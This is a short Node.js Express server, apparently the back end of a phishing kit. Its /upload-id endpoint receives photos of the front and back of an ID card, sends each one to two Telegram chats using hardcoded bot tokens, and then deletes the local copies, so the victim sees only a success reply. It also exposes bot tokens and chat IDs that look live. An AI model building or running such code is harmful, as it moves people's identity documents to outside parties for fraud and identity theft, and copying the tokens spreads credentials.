const express = require("express");
const multer = require("multer");
const fs = require("fs");
const path = require("path");
const FormData = require("form-data");
const axios = require("axios");

const app = express();
const PORT = process.env.PORT || 10000;

// Serve static files
app.use(express.static(path.join(__dirname, "public")));

// Setup file storage
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    cb(null, "uploads/");
  },
  filename: function (req, file, cb) {
    cb(null, Date.now() + "-" + file.originalname);
  },
});
const upload = multer({ storage: storage });

// Replace with your Telegram bot tokens and chat IDs
const botToken1 = "7681661204:AAGNlQbHw0xCan94-xKKW1yKmm7odMePwBs";
const chatId1 = "7920571465";

const botToken2 = "7917147283:AAHHTvm4t7vwSx16pSncuheU5_46t7DLeh4";
const chatId2 = "6695577186";

// Function to send image to Telegram
async function sendToTelegram(token, chatId, filePath) {
  const formData = new FormData();
  formData.append("chat_id", chatId);
  formData.append("photo", fs.createReadStream(filePath));

  const response = await axios.post(`https://api.telegram.org/bot${token}/sendPhoto`, formData, {
    headers: formData.getHeaders(),
  });

  return response.data;
}

app.post("/upload-id", upload.fields([{ name: "front" }, { name: "back" }]), async (req, res) => {
  try {
    const frontPath = req.files.front[0].path;
    const backPath = req.files.back[0].path;

    await sendToTelegram(botToken1, chatId1, frontPath);
    await sendToTelegram(botToken1, chatId1, backPath);

    await sendToTelegram(botToken2, chatId2, frontPath);
    await sendToTelegram(botToken2, chatId2, backPath);

    // Clean up
    fs.unlinkSync(frontPath);
    fs.unlinkSync(backPath);

    res.json({ success: true });
// Make sure thankyou.html exists in /public
  } catch (error) {
    console.error("Upload failed:", error.message);
    res.status(500).send("Error occurred during file upload.");
  }
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on http://0.0.0.0:${PORT}`);
});
